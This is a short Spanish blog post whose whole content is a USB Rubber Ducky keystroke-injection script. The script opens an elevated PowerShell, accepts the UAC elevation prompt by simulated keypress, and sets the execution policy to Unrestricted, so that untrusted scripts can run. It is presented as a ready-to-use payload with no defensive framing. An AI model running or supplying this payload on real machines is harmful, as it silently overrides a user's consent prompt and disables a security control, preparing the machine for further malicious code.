# Cambio de la directiva de ejecución para ejecutar scripts en los que no se confía
## Ducky scripts, PowerShell, Security 
### URL: https://www.jesusninoc.com/2015/01/06/cambio-de-directiva-de-ejecucion-para-ejecutar-scripts-en-los-que-no-confia/
```PowerShell
DELAY 750
GUI r
DELAY 750
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 2050
ALT s
DELAY 2050
ENTER
STRING Set-ExecutionPolicy Unrestricted
ENTER
DELAY 2050
STRING s
ENTER

```
